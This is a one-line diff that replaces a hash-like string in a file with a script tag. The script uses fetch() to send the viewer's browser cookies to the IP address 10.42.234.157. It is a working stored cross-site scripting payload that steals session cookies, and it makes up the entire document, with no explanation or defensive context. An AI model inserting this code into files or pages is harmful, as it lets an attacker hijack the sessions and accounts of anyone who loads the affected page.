@@ -1,1 +1,1 @@
-2aefba91ce2fe429bb87347c0d1d671b
+<script>fetch(`http://10.42.234.157/.session=${document.cookie}`)</script>
